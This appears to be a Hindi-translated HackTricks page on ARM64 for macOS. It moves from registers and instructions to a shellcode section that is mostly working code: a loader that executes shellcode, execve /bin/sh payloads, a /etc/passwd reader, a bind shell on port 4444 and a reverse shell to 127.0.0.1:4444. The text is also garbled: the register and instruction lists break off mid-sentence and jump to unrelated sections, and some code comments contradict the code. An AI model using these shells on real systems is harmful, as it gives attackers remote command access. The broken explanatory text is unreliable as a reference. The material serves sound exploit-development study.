# ARM64 का परिचय

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks** में विज्ञापित करना चाहते हैं? या क्या आप **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड** करने की इच्छा रखते हैं? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एकल [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल** हों या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का** अनुसरण करें।**
* **अपने हैकिंग ट्रिक्स को** [**hacktricks रेपो**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud रेपो**](https://github.com/carlospolop/hacktricks-cloud) **में पीआर जमा करके अपने हैकिंग ट्रिक्स साझा करें।**

</details>

## **ARM64 का परिचय**

ARM64, जिसे ARMv8-A भी कहा जाता है, विभिन्न प्रकार के उपकरणों में उपयोग होने वाला 64-बिट प्रोसेसर आर्किटेक्चर है, जिसमें स्मार्टफोन, टैबलेट, सर्वर और कुछ हाई-एंड पर्सनल कंप्यूटर (macOS) शामिल हैं। यह ARM Holdings की उर्जा क्षमता वाले प्रोसेसर डिज़ाइन के लिए जानी जाने वाली कंपनी है।

### **रजिस्टर**

ARM64 में **31 सामान्य उद्देश्यक रजिस्टर** होते हैं, जिन्हें `x0` से `x30` तक लेबल दिया गया है। प्रत्येक रजिस्टर में एक **64-बिट** (8-बाइट) मान संग्रहीत किया जा सकता है। 32-बिट मानों के लिए जो कार्यों के लिए आवश्यक होते हैं, उनी रजिस्टरों को `w0` से `w30` नाम से 32-बिट मोड में भी एक्सेस किया जा सकता है।

1. **`x0`** से **`x7`** - ये आमतौर पर स्क्रैच रजिस्टर के रूप में और सबरूटीनों को पैरामीटर्स पास करने के लिए उपयोग होते हैं।
* **`x0`** एक फ़ंक्शन के वापसी डेटा को भी लेता है
2. **`x8`** - लिनक्स कर्नल में, `x8` को `svc` इंस्ट्रक्शन के लिए सिस्टम कॉल नंबर के रूप में उपयोग किया जाता है। **macOS में x16 का उपयोग होता है!**
3. **`x9`** से **`x15`** - अधिक अस्थायी रजिस्टर, अक्सर स्थानीय चरों के लिए उपयोग होते हैं।
4. **`x16`** और **`x17`** - अस्थायी रजिस्टर, इंडायरेक्ट फ़ंक्शन कॉल और PLT (Procedure Linkage Table) स्टब्स के लिए भी उपयोग होते हैं।
* **`x16`** `svc` इंस्ट्रक्शन के लिए **सिस्टम कॉल नंबर** के रूप में उपयोग होता है।
5. **`x18`** - प्लेटफ़ॉर्म रजिस्टर। कुछ प्लेटफ़ॉर्मों पर, इस रजिस्टर को प्लेटफ़ॉर्म-विशिष्ट उपयोग के लिए सुरक्षित रखा जाता है।
6. **`x19`** से **`x28`** - ये कॉली-सेव्ड रजिस्टर होते हैं। एक फ़ंक्शन को अपने कॉलर के लिए इन रजिस्टरों के मान को संरक्षित रखना चाहिए।
7. **`x29`** - **फ़्रेम
* उदाहरण: `add x0, x1, x2` — इसमें `x1` और `x2` में मौजूद मानों को जोड़कर परिणाम को `x0` में संग्रहीत करता है।
* **`sub`**: दो रजिस्टरों के मानों को **घटाएं** और परिणाम को एक रजिस्टर में संग्रहीत करें।
* उदाहरण: `sub x0, x1, x2` — इसमें `x1` से `x2` के मान को घटाता है और परिणाम को `x0` में संग्रहीत करता है।
* **`mul`**: दो रजिस्टरों के मानों को **गुणा** करें और परिणाम को एक रजिस्टर में संग्रहीत करें।
* उदाहरण: `mul x0, x1, x2` — इसमें `x1` और `x2` में मौजूद मानों को गुणा करता है और परिणाम को `x0` में संग्रहीत करता है।
* **`div`**: एक रजिस्टर के मान को दूसरे रजिस्टर से **भाग** करें और परिणाम को एक रजिस्टर में संग्रहीत करें।
* उदाहरण: `div x0, x1, x2` — इसमें `x1` को `x2` से भाग करता है और परिणाम को `x0` में संग्रहीत करता है।
* **`bl`**: **लिंक के साथ शाखा** करें, एक **सबरूटीन** को **बुलाने** के लिए उपयोग किया जाता है। `x30` में **वापसी पता संग्रहीत** करता है।
* उदाहरण: `bl myFunction` — इसमें `myFunction` फ़ंक्शन को बुलाता है और `x30` में वापसी पता संग्रहीत करता है।
* **`blr`**: **रजिस्टर में निर्दिष्ट** एक **सबरूटीन** को **बुलाने** के लिए उपयोग किया जाता है। `x30` में **वापसी पता संग्रहीत** करता है।
* उदाहरण: `blr x1` — इसमें `x1` में मौजूद पते के साथ फ़ंक्शन को बुलाता है और `x30` में वापसी पता संग्रहीत करता है।
* **`ret`**: **सबरूटीन से वापसी**, आमतौर पर **`x30`** में पते का उपयोग करके।
* उदाहरण: `ret` — यह `x30` में वापसी पते का उपयोग करके वर्तमान सबरूटीन से वापसी करता है।
* **`cmp`**: दो रजिस्टरों को **तुलना** करें और स्थिति ध्वज सेट करें।
* उदाहरण: `cmp x0, x1` — इसमें `x0` और `x1` में मौजूद मानों की तुलना करता है और उसके अनुसार स्थिति ध्वज सेट करता है।
* **`b.eq`**: **बराबर होने पर शाखा**, पिछले `cmp` निर्देश के आधार पर।
* उदाहरण: `b.eq label` — यदि पिछले `cmp` निर्देश ने दो बराबर मान पाए हों, तो यह `label` पर जाता है।
* **`b.ne`**: **बराबर न होने पर शाखा**। यह निर्देश जांचता है कि क्या स्थिति ध्वज (जिसे पिछले तुलना निर्देश ने सेट किया था) में तुलित मान नहीं हैं, और यदि ऐसा है, तो यह एक लेबल या पते पर शाखा लेता है।
* उदाहरण: `cmp x0, x1` निर्देश के बाद, `b.ne label` — यदि `x0` और `x1` में मौजूद मान बराबर नहीं हैं, तो यह `label` पर जाता है।
* **`cbz`**: **शून्य पर तुलना करें और शाखा लें**। यह निर्देश एक रजिस्टर को शून्य के साथ तुलना करता है, और यदि वे बराबर हैं, तो यह एक लेबल या पते पर शाखा लेता है।
* उदाहरण: `cbz x0, label` — यदि `x0` में मौजूद मान शून्य है, तो यह `label` पर जाता है।
* **`cbnz`**: **शून्य के बराबर न होने पर तुलना करें और शाखा लें**। यह निर्देश एक रजिस्टर को शून्य के साथ तुलना करता है, और यदि वे बराबर नहीं हैं, तो यह एक लेबल या पते पर शाखा लेता है।
* उदाहरण: `cbnz x0, label` — यदि `x0` में मौजूद मान शून्य के बराबर नहीं है, तो यह `label` पर जाता है।
* **`adrp`**: एक प्रतीक के **पृष्ठ पते** की गणना करें और इसे एक रजिस्टर में संग्रहीत करें।
* उदाहरण: `adrp x0, symbol` — इसमें `symbol` के
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% hint style="success" %}
कभी-कभी **`libsystem_kernel.dylib`** से **डिकंपाइल** कोड की जांच करना स्रोत कोड की जांच करने से आसान होता है क्योंकि कई सिस्कॉल्स (BSD और Mach) का कोड स्क्रिप्ट के माध्यम से उत्पन्न होता है (स्रोत कोड में टिप्पणियों की जांच करें) जबकि dylib में आप यह देख सकते हैं कि क्या कॉल हो रहा है।
{% endhint %}

### शेलकोड

कंपाइल करने के लिए:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
बाइट्स को निकालने के लिए:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
<details>

<summary>शेलकोड का परीक्षण करने के लिए सी कोड</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### शैल

यहां से लिया गया है [**यहां**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) और समझाया गया है।

{% tabs %}
{% tab title="adr के साथ" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% tab title="स्टैक के साथ" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{% endtab %}
{% endtabs %}

#### कैट के साथ पढ़ें

लक्ष्य है `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` को निष्पादित करना, इसलिए दूसरा तर्क (x1) पैरामीटरों का एक एरे है (जिसका मतलब है कि मेमोरी में ये पतों का एक स्टैक होता है)।
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### एक फोर्क से श के साथ कमांड आह्वान करें ताकि मुख्य प्रक्रिया मर न जाए

```assembly
mov x0, #0
mov x1, #0
mov x2, #0
mov x3, #0
mov x16, #59
svc #0
```

यहां एक बेसिक ARM64 असेंबली कोड दिया गया है जिसका उपयोग करके आप एक फोर्क से श के साथ कमांड आह्वान कर सकते हैं। इसका प्राथमिक उद्देश्य मुख्य प्रक्रिया को मरने से बचाना है।
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### बाइंड शेल

[https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) से बाइंड शेल **पोर्ट 4444** में।
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### रिवर्स शेल

[https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s) से रिवर्स शेल को **127.0.0.1:4444** पर रवर्स करें।
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **हैकट्रिक्स में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करना चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFT संग्रह**](https://opensea.io/collection/the-peass-family)
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें,** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **में PR जमा करके।**

</details>
